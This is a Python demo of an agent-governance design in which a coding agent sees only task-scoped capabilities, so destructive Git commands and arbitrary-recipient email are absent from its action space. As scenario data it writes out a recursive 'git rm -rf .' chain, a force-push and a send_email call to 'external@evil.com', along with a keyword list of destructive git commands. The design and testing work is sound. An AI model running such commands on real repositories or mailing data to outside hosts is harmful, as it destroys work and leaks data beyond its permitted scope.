"""
copilot_git_governance_demo.py — Coding-agent governance via rendered capability worlds.

Demonstrates how the Agent Hypervisor model applies to GitHub Copilot-style
coding-agent workflows.  The central claim:

    A coding agent is safer when it operates in a *rendered capability world*
    than when it is given a broad raw command / Git surface.

The critical distinction is not about deny rules.  It is about whether a
dangerous action can be *expressed at all* in the actor-visible world.

    Permissions try to stop bad actions.
    Rendering removes them from the action space.

This PoC does not try to make the agent behave better.
It changes what actions exist in the actor-visible world.

Three scenarios are demonstrated:

  1. code-update     — routine feature-branch workflow
  2. release-safe    — release preparation with tags, without force-push
  3. reporting       — purpose-bound reporting (not raw email)

Usage:
    python examples/integrations/copilot_git_governance_demo.py

No external dependencies.  No LLM calls.  No subprocess execution.
Pure deterministic architectural demonstration.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Raw tool space
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class RawTool:
    """
    A primitive, unguarded operation in the raw tool space.

    Raw tools exist at the system level — before any ontology construction,
    before any rendering, before any task context is applied.  They represent
    raw capability: what the system *can* do, not what an agent *should* do.
    """
    name: str
    description: str
    is_destructive: bool = False


#: Full Git raw tool space — everything the system is capable of.
RAW_GIT_TOOLS: List[RawTool] = [
    RawTool("git_add",        "Stage files for commit",                    is_destructive=False),
    RawTool("git_commit",     "Record staged changes as a commit",         is_destructive=False),
    RawTool("git_push",       "Upload commits to remote",                  is_destructive=False),
    RawTool("git_rm",         "Remove files from working tree and index",  is_destructive=True),
    RawTool("git_reset",      "Move HEAD or unstage changes",              is_destructive=True),
    RawTool("git_clean",      "Remove untracked files from working tree",  is_destructive=True),
    RawTool("git_force_push", "Push, overwriting remote history",          is_destructive=True),
    RawTool("git_tag",        "Create an annotated release tag",           is_destructive=False),
]

#: Raw email tool — arbitrary recipient, arbitrary body.
RAW_EMAIL_TOOLS: List[RawTool] = [
    RawTool("send_email", "Send an email to any recipient with any body",  is_destructive=False),
]


# ---------------------------------------------------------------------------
# Rendered capabilities (actor-visible capability set)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class RenderedCapability:
    """
    A task-scoped, semantically named action in the actor-visible capability set.

    RenderedCapabilities are what the agent *sees*.  Raw tools are invisible.
    A RenderedCapability is narrower than its source raw tool: it has a specific
    task-scoped name, bounded semantics, and no surface beyond its intent.

    If a dangerous raw tool has no RenderedCapability entry, it does not exist
    in the agent's world.  There is no string to type, no function to call.
    """
    name: str
    description: str
    derived_from: List[str]   # names of RawTools this wraps


# ---------------------------------------------------------------------------
# Semantic action matcher
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class SemanticCandidate:
    """
    A semantic action label extracted from a raw action string.

    The matcher identifies what the action string is *trying to do* at the
    semantic level, independent of syntax.  This is the stand-in for a
    full action-mapping layer.
    """
    name: str
    source_fragment: str   # the part of the action string that produced this


# Mapping table: (keyword triggers) → semantic candidate name.
# Order matters — more specific patterns first.
_GIT_SEMANTIC_RULES: List[Tuple[Tuple[str, ...], str]] = [
    # Destructive actions — must come before their non-destructive overlaps.
    (("git rm",),              "destructive_delete"),
    (("git reset",),           "destructive_reset"),
    (("git clean",),           "destructive_clean"),
    (("git push --force",),    "force_push"),
    (("git push -f",),         "force_push"),
    # Safe actions.
    (("git add",),             "stage_changes"),
    (("git commit",),          "commit_changes"),
    (("git push",),            "push_changes"),
    (("git tag",),             "create_release_tag"),
]

_EMAIL_SEMANTIC_RULES: List[Tuple[Tuple[str, ...], str]] = [
    (("send_email",),          "send_email"),
]


def extract_semantic_candidates(action: str) -> List[SemanticCandidate]:
    """
    Identify the set of semantic actions a raw action string is attempting.

    Splits compound actions (e.g. shell pipelines joined by &&) and maps
    each fragment to a semantic candidate using handcrafted rules.

    This is a deliberate simplification — a production system would use
    a structured parser or AST-level analysis.  The goal here is clarity,
    not completeness.
    """
    # Split on && and ; to handle compound shell commands.
    fragments = [f.strip() for sep in ("&&", ";", "||") for f in action.split(sep)]
    # Re-split in case multiple separators are used.
    all_fragments: List[str] = []
    for frag in action.replace(";", "&&").replace("||", "&&").split("&&"):
        stripped = frag.strip()
        if stripped:
            all_fragments.append(stripped)

    all_rules = _GIT_SEMANTIC_RULES + _EMAIL_SEMANTIC_RULES
    candidates: List[SemanticCandidate] = []
    seen: set[str] = set()

    for fragment in all_fragments:
        fragment_lower = fragment.lower()
        matched = False
        for triggers, candidate_name in all_rules:
            if any(trigger in fragment_lower for trigger in triggers):
                if candidate_name not in seen:
                    candidates.append(SemanticCandidate(
                        name=candidate_name,
                        source_fragment=fragment,
                    ))
                    seen.add(candidate_name)
                matched = True
                break
        if not matched:
            # Unrecognised fragment — treat as unknown.
            unknown = f"unknown_action"
            if unknown not in seen:
                candidates.append(SemanticCandidate(
                    name=unknown,
                    source_fragment=fragment,
                ))
                seen.add(unknown)

    return candidates


# ---------------------------------------------------------------------------
# Capability world renderer
# ---------------------------------------------------------------------------

@dataclass
class TaskWorld:
    """
    A rendered capability world for a specific task context.

    The TaskWorld is what the agent operates in.  It contains only the
    capabilities that are meaningful and safe for the current task.
    Everything outside this world does not exist for the agent.

    In the Agent Hypervisor model this corresponds to:
      Layer 1 (Base Ontology)      — defines the safe capability vocabulary
      Layer 2 (Dynamic Projection) — selects the task-appropriate subset
    """
    task_name: str
    description: str
    raw_tools: List[RawTool]
    capabilities: Dict[str, RenderedCapability] = field(default_factory=dict)


def build_git_world(
    task_name: str,
    description: str,
    allowed_capabilities: List[str],
) -> TaskWorld:
    """
    Build a Git-domain TaskWorld with the specified rendered capabilities.

    The full rendering map defines which capabilities are possible at all.
    Passing a capability name in `allowed_capabilities` that has no render
    entry is silently ignored — the ontological boundary is the render map,
    not the allowlist.
    """
    # Full ontology-level render map for Git capabilities.
    # Dangerous raw tools (git_rm, git_reset, git_clean, git_force_push)
    # have no entry here by design.
    full_render_map: Dict[str, RenderedCapability] = {
        "stage_changes": RenderedCapability(
            name="stage_changes",
            description="Stage modified files for the upcoming commit.",
            derived_from=["git_add"],
        ),
        "commit_changes": RenderedCapability(
            name="commit_changes",
            description="Commit staged changes with a descriptive message.",
            derived_from=["git_commit"],
        ),
        "push_changes": RenderedCapability(
            name="push_changes",
            description="Push committed changes to the remote branch.",
            derived_from=["git_push"],
        ),
        "create_release_tag": RenderedCapability(
            name="create_release_tag",
            description="Create an annotated release tag on the current commit.",
            derived_from=["git_tag"],
        ),
        # force_push, destructive_delete, destructive_reset, destructive_clean
        # are NOT in this map.  They cannot be rendered, ever, by any task.
    }

    rendered: Dict[str, RenderedCapability] = {}
    for cap_name in allowed_capabilities:
        cap = full_render_map.get(cap_name)
        if cap is not None:
            rendered[cap.name] = cap

    return TaskWorld(
        task_name=task_name,
        description=description,
        raw_tools=RAW_GIT_TOOLS,
        capabilities=rendered,
    )


def build_reporting_world() -> TaskWorld:
    """
    Build a reporting-domain TaskWorld.

    The raw tool is `send_email` (arbitrary recipient).
    The rendered world provides only purpose-bound, pre-addressed senders.
    Arbitrary recipient email is not expressible.
    """
    render_map: Dict[str, RenderedCapability] = {
        "send_report_to_security": RenderedCapability(
            name="send_report_to_security",
            description="Send a structured report to the internal security team.",
            derived_from=["send_email"],
        ),
        "send_report_to_finance": RenderedCapability(
            name="send_report_to_finance",
            description="Send a structured report to the internal finance team.",
            derived_from=["send_email"],
        ),
        # send_email (generic, arbitrary recipient) has no rendered form.
        # The raw tool exists; no capability exposes it.
    }

    return TaskWorld(
        task_name="reporting",
        description="Send structured reports to approved internal recipients only.",
        raw_tools=RAW_EMAIL_TOOLS,
        capabilities=render_map,
    )


# ---------------------------------------------------------------------------
# Governance decision
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class CapabilityMatchResult:
    """Result of matching a semantic candidate against the rendered world."""
    candidate: SemanticCandidate
    matched_capability: Optional[RenderedCapability]

    @property
    def is_present(self) -> bool:
        return self.matched_capability is not None


@dataclass(frozen=True)
class GovernanceVerdict:
    """Final governance verdict for an attempted action in a TaskWorld."""
    allowed: bool
    reason: str
    candidate_results: List[CapabilityMatchResult]

    ALLOW = "ALLOWED"
    DENY  = "NO MATCHING CAPABILITY"


def evaluate_action(action: str, world: TaskWorld) -> GovernanceVerdict:
    """
    Evaluate whether an action is expressible in the given TaskWorld.

    Steps:
      1. Extract semantic candidates from the raw action string.
      2. Match each candidate against the rendered capability set.
      3. If every candidate has a matching capability → ALLOWED.
      4. If any candidate is absent from the rendered world → NO MATCHING CAPABILITY.

    The key property: absence is not a deny rule.  It is the absence of
    the action from the actor-visible world entirely.  Layer 3 (Execution
    Governance) never sees the request — it was eliminated at render time.
    """
    candidates = extract_semantic_candidates(action)

    results: List[CapabilityMatchResult] = []
    for cand in candidates:
        matched = world.capabilities.get(cand.name)
        results.append(CapabilityMatchResult(
            candidate=cand,
            matched_capability=matched,
        ))

    all_present = all(r.is_present for r in results)

    if all_present and results:
        return GovernanceVerdict(
            allowed=True,
            reason=GovernanceVerdict.ALLOW,
            candidate_results=results,
        )
    else:
        return GovernanceVerdict(
            allowed=False,
            reason=GovernanceVerdict.DENY,
            candidate_results=results,
        )


# ---------------------------------------------------------------------------
# Canonical scenarios
# ---------------------------------------------------------------------------

@dataclass
class Scenario:
    """A complete demo scenario: world + attempted action + expected outcome."""
    name: str
    world: TaskWorld
    attempted_action: str
    architectural_note: str


SCENARIOS: List[Scenario] = [
    Scenario(
        name="code-update",
        world=build_git_world(
            task_name="code-update",
            description="Stage, commit, and push code changes to a feature branch.",
            allowed_capabilities=["stage_changes", "commit_changes", "push_changes"],
        ),
        attempted_action='git rm -rf . && git commit -m "cleanup" && git push',
        architectural_note=(
            "The destructive action is not merely blocked by policy.\n"
            "  It is outside the actor-visible capability world rendered for task=code-update.\n"
            "  Dangerous action remains absent from this world.\n"
            "  Execution governance (Layer 3) never sees this request —\n"
            "  it was eliminated at render time (Layer 2)."
        ),
    ),
    Scenario(
        name="release-safe",
        world=build_git_world(
            task_name="release-safe",
            description="Prepare and publish a release: commit, tag, and push.",
            allowed_capabilities=[
                "stage_changes", "commit_changes", "push_changes", "create_release_tag"
            ],
        ),
        attempted_action="git push --force",
        architectural_note=(
            "force_push is absent from the rendered world for task=release-safe.\n"
            "  The agent cannot express a force-push — there is no capability to invoke.\n"
            "  The release workflow is intentionally bounded: it can tag and push,\n"
            "  but history-rewriting is outside this world entirely."
        ),
    ),
    Scenario(
        name="reporting",
        world=build_reporting_world(),
        attempted_action='send_email("external@evil.com", body)',
        architectural_note=(
            "The raw send_email tool accepts any recipient.\n"
            "  The rendered world provides only purpose-bound forms:\n"
            "  send_report_to_security and send_report_to_finance.\n"
            "  Arbitrary recipient email is not expressible in this world.\n"
            "  The ontology narrowing applies to recipient scope, not just Git operations.\n"
            "  The same architectural principle generalises across tool domains."
        ),
    ),
]


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------

WIDE = 62


def _line(label: str, value: str, width: int = 20) -> str:
    return f"  {label:<{width}} {value}"


def print_scenario(scenario: Scenario) -> None:
    """Print a fully structured, presentation-ready scenario block."""
    print()
    print("=" * WIDE)
    print(f"Scenario: {scenario.name}")
    print("=" * WIDE)

    # Raw tool space
    print()
    print("Raw tool space:")
    for tool in scenario.world.raw_tools:
        tag = "  [destructive]" if tool.is_destructive else ""
        print(f"  {tool.name}{tag}")

    # Rendered world
    print()
    print("Rendered actor-visible capability set:")
    if scenario.world.capabilities:
        for cap in scenario.world.capabilities.values():
            print(f"  {cap.name}")
    else:
        print("  (empty — no capabilities rendered)")

    # Attempted action
    print()
    print("Attempted action:")
    print(f"  {scenario.attempted_action}")

    # Evaluate
    verdict = evaluate_action(scenario.attempted_action, scenario.world)

    # Semantic candidates
    print()
    print("Semantic action candidates:")
    for r in verdict.candidate_results:
        print(f"  {r.candidate.name}")

    # Capability matching
    print()
    print("Capability matching:")
    max_name = max(len(r.candidate.name) for r in verdict.candidate_results)
    for r in verdict.candidate_results:
        status = "PRESENT" if r.is_present else "NOT PRESENT"
        print(f"  {r.candidate.name:<{max_name}}  ->  {status}")

    # Final result
    print()
    print("Final result:")
    if verdict.allowed:
        print("  ALLOWED")
    else:
        print("  NO MATCHING CAPABILITY")

    # Explanation
    print()
    print("Explanation:")
    for line in scenario.architectural_note.split("\n"):
        print(f"  {line}")
    print()


# ---------------------------------------------------------------------------
# Architectural summary
# ---------------------------------------------------------------------------

def print_summary() -> None:
    print()
    print("=" * WIDE)
    print("Architectural Summary")
    print("=" * WIDE)
    print()
    print("  All three scenarios share one architectural property:")
    print()
    print("    The dangerous action was not denied by a rule.")
    print("    It did not exist in the actor-visible world.")
    print()
    print("  Agent Hypervisor layer mapping:")
    print()
    print("    Layer 1  Base Ontology        —  defines the safe capability")
    print("             (design-time)            vocabulary for each domain")
    print()
    print("    Layer 2  Dynamic Projection   —  renders the task-appropriate")
    print("             (runtime)                subset for each agent context")
    print()
    print("    Layer 3  Execution Governance —  last-line policy + provenance")
    print("             (runtime)                check on the rendered set only")
    print()
    print("  Layers 1 and 2 handle dangerous actions by non-existence.")
    print("  Layer 3 handles edge cases within the already-safe rendered world.")
    print()
    print("  The problem is not only permissions.")
    print("  The problem is the action space.")
    print()
    print("  Permissions try to stop bad actions.")
    print("  Rendering removes them from the action space.")
    print()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    print()
    print("=" * WIDE)
    print("Copilot / Coding-Agent Governance PoC")
    print("Agent Hypervisor — Rendered Capability Worlds")
    print("=" * WIDE)
    print()
    print("  Claim: a coding agent is safer when it operates in a")
    print("  rendered capability world than when it is given a broad")
    print("  raw Git / shell surface.")
    print()
    print("  This demo shows three scenarios in which a destructive or")
    print("  out-of-scope action resolves to NO MATCHING CAPABILITY —")
    print("  not because it was denied, but because it does not exist")
    print("  in the actor-visible world for that task.")

    for scenario in SCENARIOS:
        print_scenario(scenario)

    print_summary()


if __name__ == "__main__":
    main()
